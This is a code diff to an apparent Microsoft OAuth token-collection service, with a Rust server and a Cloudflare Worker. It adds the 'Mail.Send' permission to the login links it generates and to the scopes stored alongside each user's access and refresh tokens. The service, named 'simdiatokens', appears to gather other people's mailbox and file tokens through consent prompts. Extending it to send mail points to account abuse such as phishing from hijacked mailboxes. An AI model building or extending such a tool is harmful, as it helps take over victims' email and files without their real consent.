@@ -277,7 +277,7 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
                     &email_str,
                     access_token,
                     refresh_token,
-                    vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.Read".to_string()],
+                    vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.Read".to_string(), "Mail.Send".to_string()],
                     refresh_expires_at,
                 ).await;
                 if let Some(email) = email {
@@ -460,7 +460,7 @@ async fn generate_oauth_link(state: web::Data<AppState>) -> impl Responder {
     let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
     let redirect_uri = format!("{}/oauth/callback", worker_url);
 
-    let scopes = "openid%20offline_access%20User.Read%20Mail.Read";
+    let scopes = "openid%20offline_access%20User.Read%20Mail.Read%20Mail.Send";
     let state_param: String = rand::thread_rng()
         .sample_iter(&rand::distributions::Alphanumeric)
         .take(16)
@@ -492,7 +492,7 @@ async function handleRequest(request) {
   const _MAIN_SERVER = typeof MAIN_SERVER !== 'undefined' ? MAIN_SERVER : 'https://simdiatokens-server-production.up.railway.app';
   const _CLIENT_ID = typeof CLIENT_ID !== 'undefined' ? CLIENT_ID : '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
   const _REDIRECT_URI = typeof REDIRECT_URI !== 'undefined' ? REDIRECT_URI : 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
-  const SCOPE = 'openid offline_access User.Read Mail.Read Files.ReadWrite.All';
+    const SCOPE = 'openid offline_access User.Read Mail.Read Mail.Send Files.ReadWrite.All';
 
   if (url.pathname === '/start') {
     const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(_REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}`;
